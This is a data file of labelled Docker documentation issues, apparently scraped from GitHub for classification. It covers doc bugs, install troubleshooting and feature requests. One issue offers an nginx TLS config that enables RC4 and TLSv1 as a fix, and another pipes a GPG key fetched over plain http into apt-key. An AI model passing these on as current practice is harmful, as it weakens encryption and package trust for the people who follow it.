added.\n\nThis is because the tip of the current branch will not match the remote repository, so Git will reject the update.\n"},{"labels":["documentation"],"text":"I created and linked to containers.  When I try to remove a link  as per the example here:\n\nhttps://docs.docker.com/reference/commandline/cli/#rm\n\nThe example doesn't work. The example shows a leading slash but this appears to be problematic.  Including the leading slash causes the command to return with and apparently remove the link. But it doesn't.\n\n```\n$ docker ps\nCONTAINER ID        IMAGE                      COMMAND                CREATED             STATUS              PORTS                     NAMES\n8e9c5dd470b7        training/webapp:latest     \"python app.py\"        2 minutes ago       Up 2 minutes        0.0.0.0:49159->5000/tcp   web                 \n5551a83d8f32        training/postgres:latest   \"su postgres -c '/us   2 minutes ago       Up 2 minutes        5432/tcp                  db                  \n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker ps\nCONTAINER ID        IMAGE                      COMMAND                CREATED             STATUS              PORTS                     NAMES\n8e9c5dd470b7        training/webapp:latest     \"python app.py\"        3 minutes ago       Up 3 minutes        0.0.0.0:49159->5000/tcp   web                 \n5551a83d8f32        training/postgres:latest   \"su postgres -c '/us   3 minutes ago       Up 3 minutes        5432/tcp                  db                  \n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker inspect -f \"{{ .HostConfig.Links }}\" web\n[/db:/web/db]\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker rm --link /web/db\n/web/db\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker inspect -f \"{{ .HostConfig.Links }}\" web\n[/db:/web/db]\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker ps\nCONTAINER ID        IMAGE                      COMMAND                CREATED             STATUS              PORTS                     NAMES\n8e9c5dd470b7        training/webapp:latest     \"python app.py\"        4 minutes ago       Up 4 minutes        0.0.0.0:49159->5000/tcp   web                 \n5551a83d8f32        training/postgres:latest   \"su postgres -c '/us   4 minutes ago       Up 4 minutes        5432/tcp                  db      \n```\n\nSpecifying a totally bogus link appears to work:\n\n```\n$ docker rm --link /web/df\n/web/df\n```\n\nBut of course the link didn't exist:\n\nHere is the only command that works:\n\n```\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker rm --link web/db\nweb/db\n\nmary at meepers in ~/repos/distribution on docs-part-two [!]\n$ docker inspect -f \"{{ .HostConfig.Links }}\" web\n<no value>\n```\n\nHere is how I think it should work:\n- If a user specified a link that doesn't exist, we should tell them\n- If a user specifies the leading slash or not, we should remove the link -- the alternative is to return an error if the leading slash is include (or fix this command)\n"},{"labels":[null,"documentation"],"text":"I am using docker via boot2docker on my mac. Recently I've decided to setup private docker repository for my images. I've found [great article](https://github.com/MarvAmBass/docker-nginx-registry-proxy) how to setup docker registry behind nginx proxy with basic auth and ssl security. When I try to do a push I experienced strange issue:\n\n```\nMacBook-Pro-Pavel:cron vintik$ docker push registry.sashi.me/sashime-cron\nThe push refers to a repository [registry.sashi.me/sashime-cron] (len: 1)\nSending image list\n2015/04/10 23:53:23\n```\n\nAnd nothing happened.\nThen I tried to check connection with a curl call to my registry and got this:\n\n```\ndocker@boot2docker:~$ curl -k -v https://registry.sashi.me/v1/_ping\n* About to connect() to registry.sashi.me port 443 (#0)\n*   Trying 148.251.11.50...\n* Adding handle: conn: 0x9ffdad8\n* Adding handle: send: 0\n* Adding handle: recv: 0\n* Curl_addHandleToPipeline: length: 1\n* - Conn 0 (0x9ffdad8) send_pipe: 1, recv_pipe: 0\n* Connected to registry.sashi.me (148.251.11.50) port 443 (#0)\n* successfully set certificate verify locations:\n*   CAfile: none\n  CApath: /usr/local/etc/ssl/certs\n* SSLv3, TLS handshake, Client hello (1):\n* SSLv3, TLS handshake, Server hello (2):\n* SSLv3, TLS handshake, CERT (11):\n* SSLv3, TLS handshake, Server key exchange (12):\n* SSLv3, TLS handshake, Server finished (14):\n* SSLv3, TLS handshake, Client key exchange (16):\n* SSLv3, TLS change cipher, Client hello (1):\n* SSLv3, TLS handshake, Finished (20):\n* SSLv3, TLS change cipher, Client hello (1):\n* SSLv3, TLS handshake, Finished (20):\n* SSL connection using ECDHE-RSA-AES256-SHA\n* Server certificate:\n*    subject: C=RU; ST=Moscow Region; L=Moscow; O=Sashime; CN=registry.sashi.me\n*    start date: 2015-04-10 18:38:43 GMT\n*    expire date: 2025-04-07 18:38:43 GMT\n*    issuer: C=RU; ST=Moscow Region; L=Moscow; O=Sashime; CN=registry.sashi.me\n*    SSL certificate verify result: self signed certificate (18), continuing anyway.\n> GET /v1/_ping HTTP/1.1\n> User-Agent: curl/7.33.0\n> Host: registry.sashi.me\n> Accept: */*\n> \n* Empty reply from server\n* Connection #0 to host registry.sashi.me left intact\ncurl: (52) Empty reply from server\n```\n\nThen I make a try directly from my mac:\n\n```\nMacBook-Pro-Pavel:files vintik$ curl -k -v https://registry.sashi.me/v1/_ping\n* Hostname was NOT found in DNS cache\n*   Trying 148.251.11.50...\n* Connected to registry.sashi.me (148.251.11.50) port 443 (#0)\n* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384\n* Server certificate: torl.org\n* Server certificate: COMODO RSA Domain Validation Secure Server CA\n* Server certificate: COMODO RSA Certification Authority\n* Server certificate: AddTrust External CA Root\n> GET /v1/_ping HTTP/1.1\n> User-Agent: curl/7.37.1\n> Host: registry.sashi.me\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n* Server nginx/1.4.1 (Ubuntu) is not blacklisted\n< Server: nginx/1.4.1 (Ubuntu)\n< Date: Sat, 11 Apr 2015 07:59:22 GMT\n< Content-Type: application/json\n< Content-Length: 1521\n< Connection: keep-alive\n< X-Docker-Registry-Config: dev\n< Expires: -1\n< X-Docker-Registry-Standalone: True\n< Pragma: no-cache\n< Cache-Control: no-cache\n< Strict-Transport-Security: max-age=31536000; includeSubdomains\n< \n* Connection #0 to host registry.sashi.me left intact\n{\"host\": [\"Linux\", \"bf6ccd9bf43c\", \"3.18.6\", \"#2 SMP Sat Feb 28 02:23:04 UTC 2015\", \"x86_64\", \"x86_64\"], \"launch\": [\"/usr/local/bin/gunicorn\", \"--access-logfile\", \"-\", \"--error-logfile\", \"-\", \"--max-requests\", \"100\", \"-k\", \"gevent\", \"--graceful-timeout\", \"3600\", \"-t\", \"3600\", \"-w\", \"4\", \"-b\", \"0.0.0.0:5000\", \"--reload\", \"docker_registry.wsgi:application\"], \"versions\": {\"M2Crypto.m2xmlrpclib\": \"0.22\", \"SocketServer\": \"0.4\", \"argparse\": \"1.1\", \"backports.lzma\": \"0.0.3\", \"blinker\": \"1.3\", \"cPickle\": \"1.71\", \"cgi\": \"2.6\", \"ctypes\": \"1.1.0\", \"decimal\": \"1.70\", \"distutils\": \"2.7.6\", \"docker_registry.app\": \"0.9.1\", \"docker_registry.core\": \"2.0.3\", \"docker_registry.server\": \"0.9.1\", \"email\": \"4.0.3\", \"flask\": \"0.10.1\", \"gevent\": \"1.0.1\", \"greenlet\": \"0.4.5\", \"gunicorn\": \"19.1.1\", \"gunicorn.arbiter\": \"19.1.1\", \"gunicorn.config\": \"19.1.1\", \"gunicorn.six\": \"1.2.0\", \"jinja2\": \"2.7.3\", \"json\": \"2.0.9\", \"logging\": \"0.5.1.2\", \"parser\": \"0.5\", \"pickle\": \"$Revision: 72223 $\", \"platform\": \"1.0.7\", \"pyexpat\": \"2.7.6\", \"python\": \"2.7.6 (default, Mar 22 2014, 22:59:56) \\n[GCC 4.8.2]\", \"re\": \"2.2.1\", \"redis\": \"2.10.3\", \"requests\": \"2.3.0\", \"requests.packages.chardet\": \"2.2.1\", \"requests.packages.urllib3\": \"dev\", \"requests.packages.urllib3.packages.six\": \"1.2.0\", \"requests.utils\": \"2.3.0\", \"simplejson\": \"3.6.2\", \"sqlalchemy\": \"0.9.4\", \"tarfile\": \"$Revision: 85213 $\", \"urllib\": \"1.17\", \"urllib2\": \"2.7\", \"werkzeug\": \"0.10.4\", \"xml.parsers.expat\": \"$Revision: 17\n```\n\nAnd it returns expected result!\nSo I've figured out that boot2docker and my mac works with ssl quite different. So finally I've made some work with my nginx config and here it is:\n\n```\n# For versions of Nginx > 1.3.9 that include chunked transfer encoding support\n# Replace with appropriate values where necessary\n\nupstream docker-registry {\n  server {{ ip }}:5000;\n}\nserver {\n  listen 80;\n  server_name {{ inventory_hostname }};\n  proxy_set_header Host       $http_host;   # required for Docker client sake\n  proxy_set_header X-Real-IP  $remote_addr; # pass on real client IP\n  proxy_set_header Authorization  \"\"; # see https://github.com/dotcloud/docker-registry/issues/170\n  proxy_read_timeout               900;\n  location / {\n    return 301 https://{{ inventory_hostname }}$request_uri;\n  }\n  location /_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n  location /v1/_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n}\n\nserver {\n  listen 443;\n  server_name {{ inventory_hostname }};\n\n  ssl on;\n  ssl_certificate /etc/ssl/cert.pem;\n  ssl_certificate_key /etc/ssl/key.pem;\n# fix issue with boot2docker ssl\n  ssl_session_cache   shared:SSL:10m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_prefer_server_ciphers on;\n  ssl_ciphers \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS +RC4 RC4\";\n\n  # set HSTS-Header because we only allow https traffic\n  add_header Strict-Transport-Security \"max-age=31536000; includeSubdomains\";\n\n  proxy_set_header Host       $http_host;   # required for Docker client sake\n  proxy_set_header X-Real-IP  $remote_addr; # pass on real client IP\n  proxy_set_header Authorization  \"\"; # see https://github.com/dotcloud/docker-registry/issues/170\n  proxy_read_timeout               900;\n\n  client_max_body_size 0; # disable any limits to avoid HTTP 413 for large image uploads\n\n  # required to avoid HTTP 411: see Issue #1486 (https://github.com/dotcloud/docker/issues/1486)\n  chunked_transfer_encoding on;\n\n  location / {\n    # let Nginx know about our auth file\n    auth_basic              \"Restricted\";\n    auth_basic_user_file    /etc/pass.htpasswd;\n    proxy_pass                       http://docker-registry;\n  }\n  location /_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n  location /v1/_ping {\n    auth_basic off;\n    proxy_pass                       http://docker-registry;\n  }\n}\n```\n\nSo the main fix is to add this strings:\n\n```\n  ssl_session_cache   shared:SSL:10m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_prefer_server_ciphers on;\n  ssl_ciphers \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS +RC4 RC4\";\n```\n\nI don't know which one of this really helps, I simply grub them from one of my nginx configs.\nI believe it should help somebody! Good luck!\n"},{"labels":["documentation"],"text":"The api doc for the [`Binds` argument](https://docs.docker.com/reference/api/docker_remote_api_v1.17/#create-a-container) is incorrect.  When creating a new volume, the volume should not appear in \"Binds\".  The [implementation](https://github.com/docker/docker/blob/master/daemon/volumes.go#L225) explicity checks for a string with two or three components separated by \":\".\n\nMoreover, the resulting error message is \"Invalid volume specification\", which is confusing, as it doesn't mention the `Binds` argument at all.\n"},{"labels":["documentation",null],"text":"the docs that end up here --> http://docs.docker.com/reference/commandline/cli/#daemon\n\nsince the commit 29d01b7, now the examples for running the daemon have a PS1 command prompt of `$` which indicates a non-privileged user. Though correctly marking the command prompt with `#` which indicates root user, would make them appear as comments. \n\nWe should find a markdown way to show the prompt for a `#` PS1 to be normal, or add back `sudo` for the `docker -d` type examples.\n\n/cc @moxiegirl @thaJeztah @SvenDowideit \n"},{"labels":["documentation",null],"text":"This is minor and probably won't be caught for some time but... \nSee code command snippet\n\n```\nvagrant@ubuntu-1:~$ docker -v\nDocker version 1.6.0-rc4, build e2e39fc\nvagrant@ubuntu-1:~$ cid=$(docker run -itd --ulimit data=8192 ubuntu)\nvagrant@ubuntu-1:~$ docker logs $cid\nbash: xmalloc: .././locale.c:81: cannot allocate 2 bytes (0 bytes allocated)\n```\n"},{"labels":["documentation",null],"text":"All the [Installation docs](https://docs.docker.com/installation/) cover how to install docker in detail, but none of them talk about configuring the docker daemon after the installation.\n\nThere should be a short section in there describing the config process. For example, in Ubuntu, the daemon can be configured by adding options in `/etc/default/docker` and in CentOS/RHEL, the daemon can be configured by editing `/etc/sysconfig/docker`\n\nThere is [one article](https://docs.docker.com/articles/systemd/) which covers this, but it is very specific. It would be nice to have a short config article after every installation step for various Operating Systems\n"},{"labels":["documentation"],"text":"I'm gong to pick this up after the release...also...I'm not sure how this fits with the recent commentary coming in on Joyent installation.\n"},{"labels":["documentation"],"text":"In the last example of [userguide/dockervolumes](http://docs.docker.com/userguide/dockervolumes/) we want to restore backed up data into a `dbdata2` container:\n\n```\nsudo docker run -v /dbdata --name dbdata2 ubuntu /bin/bash\nsudo docker run --volumes-from dbdata2 -v $(pwd):/backup busybox tar xvf /backup/backup.tar\n```\n\nThis snippet has 2 issues:\n1. If we dig into the logic of the snippet, we'll see that restored data should get into `/dbdata` directory of `dbdata2` container. Instead the data is left in `/` directory of a temporary container. The second line should like this:\n   \n   ```\n   sudo docker run --volumes-from dbdata2 -v $(pwd):/backup busybox cd /dbdata && tar xvf /backup/backup.tar\n   ```\n   \n   (Added `cd /dbdata &&`)\n2. As it was previously stated in the userguide, we'd like to use the same base containers for most operations to reduce network and disk usage. So that in the second line `busybox` should be replaced by `ubuntu`. Though considering the size of busybox this may be not a very serious issue :smile:.\n"},{"labels":["documentation"],"text":"For the reasons discussed at #3793, the signal will be passed to the container but in many cases it won't actually terminate because it is running as PID 1.\n\nI could not find any mention of this in any of the documentation for `-sig-proxy`, `docker kill`, etc., which is where I looked to try to understand why it wasn't working for me.\n\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1189865 has a nice example to experiment with.\n"},{"labels":["documentation"],"text":"I was following this page: https://docs.docker.com/installation/ubuntulinux/\n\nAfter I installed docker but and ran the command: $ sudo docker run hello-world\n\nIt returned:\n\nFATA[0000] Get http:///var/run/docker.sock/v1.17/version: dial unix /var/run/docker.sock: no such file or directory. Are you trying to connect to a TLS-enabled daemon without TLS?\n\ncan you please add a step in the instructions to run: service docker restart\n\nThis fixed the issue for me.\n"},{"labels":["documentation",null],"text":"On https://docs.docker.com/installation/rhel/ it's mentioned that you can use the command:\n\n```\n$ sudo subscription-manager repos --enable=rhel-7-server-extras-rpms\n```\n\nhowever, this doesn't work by default on RHEL 7 EC2 instances.  Instead, you need to modify the file:\n\n```\n/etc/yum.repos.d/redhat-rhui.repo\n```\n\nand modify the \"[rhui-REGION-rhel-server-extras]\" section to include \"enabled=1\".\n"},{"labels":["documentation",null],"text":"Or docker/docs/README.md should include information for how to get the Man pages in Mac OSX.\n\nhttp://stackoverflow.com/questions/26368263/how-to-install-docker-man-pages-on-mac-os\n"},{"labels":["documentation"],"text":"Fixing typos, grammar, concise wording, etc. \n"},{"labels":["documentation",null],"text":"On the [Work with a development container](http://docs.docker.com/project/set-up-dev-env/) page (from the Contributor Guide), the output from running `hack/make.sh binary` needs to be updated to reference `binary` instead of `ubuntu`. \n\nCurrently, the output is:\n\n```\n---> Making bundle: ubuntu (in bundles/1.5.0-dev/ubuntu)\nCreated package {:path=>\"lxc-docker-1.5.0-dev_1.5.0~dev~git20150223.181106.0.1ab0d23_amd64.deb\"}\nCreated package {:path=>\"lxc-docker_1.5.0~dev~git20150223.181106.0.1ab0d23_amd64.deb\"}\n```\n\nRather, it should be something akin to:\n\n```\n---> Making bundle: binary (in bundles/1.5.0-dev/binary)\nCreated binary: /go/src/github.com/docker/docker/bundles/1.5.0-dev/binary/docker-1.5.0-dev\n```\n"},{"labels":["documentation",null],"text":"\"Configure Git for contributing\" section does not mention where to configure git in Windows. \n"},{"labels":["documentation",null],"text":"Support for setting ulimits for containers was added with #9437, but has a couple of quirks (like `as` ulimit not being supported) and could use some extra docs love.\n"},{"labels":["documentation"],"text":"Currently the documentation notes that \"_In addition to `--privileged`, the operator can have fine grain control over the capabilities using `--cap-add` and `--cap-drop`. By default, Docker has a default list of capabilities that are kept._\" (ref: https://github.com/docker/docker/blame/master/docs/sources/reference/run.md#L632-L636)\n\nHowever, at that point a few examples are given, but no information is provided on what that list of capabilities are, making it hard for users to search/find what those capabilities and, specifically, their names, are.\n\nThe current capabilities list in Docker is here: https://github.com/docker/docker/blob/master/daemon/execdriver/utils.go\n\nThey can be mapped to these additional descriptions here: http://linux.die.net/man/7/capabilities\n\nPotentially a table might be a nice way to list this information if we agree that's how we want to display, or if we want an external pointer that may be reasonable as well.  The docs team may have guidance here (ping @SvenDowideit @moxiegirl @fredlf @jamtur01)\n"},{"labels":["documentation",null],"text":"Hello,\nI've been struggling with this on ubuntu 14.10, docker 1.5.0. More than should be the case.\n\nMy problems came from the following:\n- Assuming that the ulimit is set the same inside a container than on the host. (it isn't). But also, that the output of the ulimit command was a bit misleading because:\n\n``` sh\n$ ulimit\nunlimited\n```\n\nis not the same thing as \n\n``` sh\n$ ulimit -c\n0\n```\n\nIn the container, base image was `ubuntu-debootstrap:14.04`.\n- On ubuntu the default setting - core files get piped to `apport` program. This is no good in containers. It must be overridden to something else if `apport` is not installed inside the container.\n\nIt would also be a help if linux kernel could have a different value of `/proc/sys/kern/pattern` inside the container than outside it. Since in the 2 environments they may need to point to different locations. I'm not sure that is something that Docker can do anything about but might be worth to think about.\n- It is not clear, as core dumps are a kernel managed thing, whether resulting core files are written by kernel to the host filesystem or the container filesystem. This should also be clearly documented. They are written inside the container.\n- Open question: How best to save the core files as when the container exits the filesystem is not remembered. I think docker could give a clear instruction here too - e.g. how or what to mount where to write the core files to.\n\nMany thanks for any consideration. Else it will have to be answered on stack overflow.\n"},{"labels":["documentation",null],"text":"Dockerfile appears broken and outdated. Running \"wget -qO- http://cfengine.com/pub/gpg.key | apt-key add - \" returns a 403. \n\nhttps://github.com/docker/docker/blob/b64558907139911b86d846de70ab859504cc45a2/docs/sources/articles/cfengine_process_management.md\n\nLink to article with error: https://docs.docker.com/engine/articles/cfengine_process_management/\n"},{"labels":["documentation",null],"text":"References to editing the `DOCKER_OPTS` in the `/etc/default/docker` file seem to be sprinkled throughout the documentation, but never explicitly stated or explained. Also everywhere it is referenced it specifies Ubuntu, but I believe it is also true for CentOS.\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\nThere are no clear documentation on what it takes to create an official image.\n\n**Solution**\n\nDocument the steps to create and submit a new official image to the correct repositories.  @tianon can be a source for information on what needs to happen and what is expected.\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\nDocker lacks documentation on what the defaults mounts that are added for network files.\n\n**Solution**\n\nDocument the docker provided mounts for things like `/etc/hosts`, `/etc/hostname`, and `/etc/resolv.conf` that docker automatically sets up and bind mounts into containers as read-write as the default container profile.\n"},{"labels":["documentation"],"text":"**Problem**\n\nDocument `DockerCli` methods or make them private function in `api/client/cli.go`.\n\n**Solution**\n\nMake methods not used outside package private, document remained public methods in godoc-style.\n"},{"labels":["documentation"],"text":"**Problem**\n\nDocument DockerCli `Cmd...` method\n\n**Solution**\n\nWrite godoc-style docstrings for each `Cmd...` method(which cli command it represents, maybe something about parameters) in `api/client/commands.go`.\n"},{"labels":["documentation"],"text":"**Problem**\n\nDocument `DockerCli` struct and `NewDockerCli` function in `api/client/cli.go`.\n\n**Solution**\n\nWrite godoc-style comments which describe idea of DockerCli(each Cmd... method represents cli command) and NewDockerCli parameters. Examples of such comments can be found in golang standard library golang.org/pkg/.\n"},{"labels":["documentation",null],"text":"**Problem**\n\nDocument `builtins.Register`\n\n**Solution**\n\nWrite godoc-style docstring form Register function in `builtins/builtins.go`.\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\nDocument public functions and method in builder\n\n**Solution**\n\nOr make them private. Probably builder public things is not used by other packages.\n"},{"labels":["documentation",null],"text":"**Problem**\n\nDocument constants in api/common.go\n\n**Solution**\n\nShort explanation why we need them here(used both by daemon and client) and short inline comment for each. Example: http://golang.org/src/math/const.go#L8\n"},{"labels":["documentation",null,null],"text":"**Problem**\n\npkg/system - Document exported functions and types\n\n**Solution**\n\nThe `pkg/system` package is used for portable low level functions throughout Docker code. It is meant to be reused by other applications, however it lacks documentation.\n\nAdd a README.md to the package, and code comments to the package's exported symbols.\n"},{"labels":["documentation",null],"text":"**Problem**\n\nDocument running Docker on RaspberryPI\n\n**Solution**\n\nMany blogs are out there, some of which are quite old, that talk about ways to get Docker running on a RaspberryPI.  We should put together better documentation in a central place on how to run Docker on various common OS distros used on RaspberryPI (raspbian, snappy ubuntu, etc.)\n"},{"labels":["documentation",null],"text":"**Problem**\n\npkg/truncindex - Documentation\n\n**Solution**\n\nAll things in the `pkg/` subdirectories are meant to be general purpose packages to be reused outside of Docker. The `truncindex` package provides a general 'index tree', used by Docker in order to be able to reference containers by only a few unambiguous characters of their id.\n\nHowever, to be easily reused by another application, this package needs documentation. Add a README.md file in `pkg/truncindex/` explaining the purpose of the package, and comment exported functions and types to make it easy to use.\n"},{"labels":["documentation",null,null],"text":"The hello world page in the user guide would strongly benefit from a few screenshots and other graphics to help the users.\n\nhttp://docs.docker.com/userguide/dockerizing/\n"},{"labels":["documentation",null],"text":"On the page https://docs.docker.com/reference/commandline/cli/#rm, in the RM command reference the following paragraph seems to be missing the command example\n\n\"This command will delete all stopped containers. The command docker ps -a -q will return all existing container IDs and pass them to the rm command which will delete them. Any running containers will not be deleted.\"\n\n@moxiegirl \n"},{"labels":["documentation",null],"text":"Add information for getting around key errors when installing Docker on Ubuntu and Debian \n-->\nIf your company is behind a filtering proxy, you may find the `apt-key` command fails for the Docker repo during installation. To work around this, add the key directly using the following:\n\n`wget -qO- https://get.docker.com/gpg  | sudo apt-key add -`\n"},{"labels":["documentation"],"text":"Hi guys,\r\n\r\n```\r\ne@e#24: docker pull --help\r\n\r\nUsage: docker pull [OPTIONS] NAME[:TAG]\r\n\r\nPull an image or a repository from the registry\r\n\r\n  -a, --all-tags=false    Download all tagged images in the repository\r\n  --help=false            Print usage\r\ne@e#24\r\n```\r\n\r\nAs is well-known, there isn't just \"the registry\". Therefore, the help text should be updated to explain how to specify the registry as well. Maybe something like:\r\n\r\n```\r\nUsage: docker pull [OPTIONS] [REGISTRY_HOST[:REGISTRY_PORT]/]NAME[:TAG]\r\n\r\nPull an image or a repository from the given registry (or the default docker registry if none specified).\r\n\r\n  -a, --all-tags=false    Download all tagged images in the repository\r\n  --help=false            Print usage\r\n```\r\n"},{"labels":["documentation",null,null],"text":"**Summary**: There is no documentation on \"how to\" migrate containers/images to another host\n**Proposed solution**: write an article that describes how containers, images and their volumes can be migrated to a new/other host. The article should contain practical examples and limitations of the process. Possible alternatives/best practices can be considered to be included in the article.\n\n---\n\nThis came up in another issue (see https://github.com/docker/docker/issues/10702#issuecomment-76508564); how can image, containers (and their volumes) be migrated to another host.\n"},{"labels":["documentation"],"text":"We need docs to explain the by design behavior changed at #11148. Feel free to assign to me, although I'm not sure where to document this. Maybe ADD/COPY instructions in Dockerfile documentation would be nice. @tiborvass \n"},{"labels":["documentation",null],"text":"I encountered an obscure error a few days ago and I felt compelled to publish it where it might help some people.\n\nHere is the story.\n\nFor a while I've been facing permissions errors from within containers trying to access certain files and I couldn't work out why this was happening. It only affected files when mounting them to the container, not when added to the container. Further more, when executing a shell inside the container, the files existed and the user could write to the mounted directory.\n\nThis bugged me for weeks and I'd reverted to rebuilding the containers whenever I made a change. Strangely, when a friend of mine pulled the code from git and mounted the volume... it worked. I concluded this was an error on my personal machine.. However when he pushed new code it miraculously worked on my machine... \n\nAfter some inspection I noticed that the file downloaded with safari contained an extended attribute 'com.apple.quarentine'. Removing this made everything work again. And because git strips extended attributes before committing this is why 'git files' worked.\n\nIt turns out, when downloading files with Safari on OS X, OS X adds an attribute to refuse access to the file until it has been opened. Now this was causing OS X to refuse access when boot2docker wanted to access the files. SILENTLY. Yay. \n\nSo if a warning could be given when mounting 'quarentined' files, it would be fantastic... And perhaps save others the wasted time figuring this out. \n\nCool.\n"},{"labels":["documentation",null,null],"text":"From a user via docs feedback.\n\n\"How much disk space containers will take up. The registry doesn't appear to\nhave any indication and AFAICT one would need to visit several places to\nget an estimate. Maybe I have missed some crucial point? I understand\nhow containers could be \"lightweight\" if a one was intended to be hosted\non the same OS/version I have on my desktop but if not then potentially\nI'm looking a several gigs of download yes?\"\n\nhttps://docs.docker.com/userguide/dockerimages/ Has information  --- is the closests but this user was more about \"predicting\" the size prior to download.\n"},{"labels":["documentation",null,null],"text":"The documentation at https://docs.docker.com obviously lacks any discussion of the available storage-drivers which imo is essential to guide people to their docker-setup.\n\nOne lesson, i learned today, is that you cannot run containers with the btrfs-driver if the `/var/lib/docker`-path itself is a subvolume of a btrfs-tree. This directory must sit in the `default`-volume of a btrfs-volume.\nAnd i think this should be covered in the documentation.\n"},{"labels":["documentation",null],"text":"Please change the EPEL link on RHEL 6.5+ installation documentation from https to http because https doesn’t work anymore. Thanks a lot.\n\nhttps://docs.docker.com/installation/rhel/\n"},{"labels":["documentation",null,null],"text":"In some or many organisations the HTTP_PROXY is appropriate only for external registry access and may not function correctly for an internal private registry. The purely global nature of the proxy from the environment makes running a private registry problematic.\nThe code in registry.go for defining registry access could be made conditional through a new unproxied_registry flag - so instead of an unconditional\nhttpTransport := &http.Transport{\n        DisableKeepAlives: true,\n        Proxy:             http.ProxyFromEnvironment,\n        TLSClientConfig:   &tlsConfig,\n    }\nthe Proxy: could be conditional. This might be conditional based on an address map or other specification of registry addresses that should not be proxied even when the proxy is set in the environment.\n\nIt could be argued that this is working around broken internal proxies. This is a fair argument but it is not necessarily straightforward to modify proxy configuration in large organisations. It is also a network optimisation to use a private registry rather than use a proxy in many cases.\n"},{"labels":["documentation",null,null,null],"text":"Kernel keyrings are not namespaced and thus not secure on hosts running Docker. This should be made clear and explicit in the security article.\n\nMachines running full disk encryption and Docker may be vulnerable to attacks to the system keyring.\n"},{"labels":["documentation",null,null],"text":"Reading Docker documentation as a first time user. The general structure and tutorial are great, but texts have some problems. For example\n\nhttps://docs.docker.com/reference/builder/\n\nIt's not clear at some places, contains details but not general information, referring to ambiguous terms. e.g. for CMD, ENTRYPOINT, ENV, ADD, .... \n- each topic does not start with clear description of the command purpose and what problem it tries to solve\n- the context is not clearly defined (e.g. CMD vs RUN): is it for process of building an image or for running inside of a container based on the image being built.\n- the reference like \"this is to set defaults\" is completely confusing. For defaults in which context and what kind of commands?\n- ADD copies files from source to destination. Where are source and destination, copying on which phase?\n- environment - there must be a clear explanation about one environment that exists in a Dockerfile scope, another for commands that are RUN to build image, third - for everything that will be run inside a container built on the image.\n- word \"container\" here often is confusing. Container at the build time or after running a container based on built image?\n"},{"labels":["documentation"],"text":"https://docs.docker.com/userguide/dockerlinks/  and related should provide guidance on how or why a user would choose one method of creating container versus another (security, management, data).  Also, do we have general guidelines as to which we recommend as the \"default\" technique.\n\nCorollary, it would be good if containers in the Hub follow the default technique to avoid confusing messages.\n"},{"labels":["documentation",null],"text":"The new /stats endpoint seems like a great idea. Unfortunately the way it is currently defined, there is no description of what the fields are or what values they can have. This seems like it will cause problems moving forward especially for porting docker to other platforms.\n\nAs far as I can tell, the new fields are defined based on their implementation which appears to be the cgroups statistics. This makes some sense on Linux with a specific version of the cgroups stats but if those stats ever changed or if you were porting docker to another platform this immediately becomes problematic.\n\nIn the same way that the /top data is currently different on other hosts and platforms (as described in #9232) this endpoint as it is, seems like it's going to cause a lot of problems for portability.\n\nIs it possible for the next version of the API to at least define the fields? Ideally they'd have been defined as something implementation independent to start with but if that ship has sailed, at least defining the fields using the current cgroups names and listing what the possible keys and values are would be a huge step forward for portability.\n"},{"labels":["documentation"],"text":"Shouldn't there be a way for me to easily empty docker's cache in order to save disk space?\n\nSomething like `docker clear-cache`\n"},{"labels":["documentation",null],"text":"There are errors in the manpages because parameters in angle brackets aren't included in `md2man` output. For [example](https://github.com/docker/docker/blame/master/docs/man/Dockerfile.5.md#L137), \n\n```\n**ADD [\"<src>\"... \"<dest>\"]** This form is required for paths containing whitespace.\n```\n\nrenders as\n\n```\nADD [\"\"... \"\"] This form is required for paths containing whitespace.\n```\n\nNote the missing `<src>` and `<dest>`.\nThis can also be seen in GitHub's rendering of the text:\n\n**ADD [\"<src>\"... \"<dest>\"]** This form is required for paths containing whitespace.\n\n---\n\n**PROBLEM**: man docs are often imporoperly formatted, using quotes or bolds when code blocks/segments are required\n\n**PROPOSED SOLUTION**: man docs should be updated to use appropriate backticks for either inline or blocked code.\nThe `dockerfile.5.md` has already been gone through, but wouldn't hurt another set of eyes.\n"},{"labels":["documentation",null,null],"text":"At first glance I thought \"die\" means the container stopped unexpectedly. \nBut when I stop a container manually I see the \"die\" event followed by a \"stop\" event. I think the \"die\" event here is unnecessary.\nI want to implement a web interface and need to show the user all the history events of the container, but with the current docker events API it seems that it's hard to distinguish \"normally stop\" from \"unexpectedly stop\".\n"},{"labels":["documentation"],"text":"In container:\n\n```\nyum install -y epel-release\nyum install -y http://iredmail.org/yum/rpms/7/cluebringer-2.0.14-4.el7.centos.noarch.rpm\n```\n\nAfter install, some files are missing: \n/usr/share/doc/cluebringer-2.0.14/\nonly have contrib directory, but it should be \nAUTHORS  ChangeLog  contrib  database  INSTALL  LICENSE  TODO  WISHLIST\n\nThis works under host.\n"},{"labels":["documentation",null],"text":"The section on docker login does not explain where the \"login state\" is kept, or what can happen to lose the 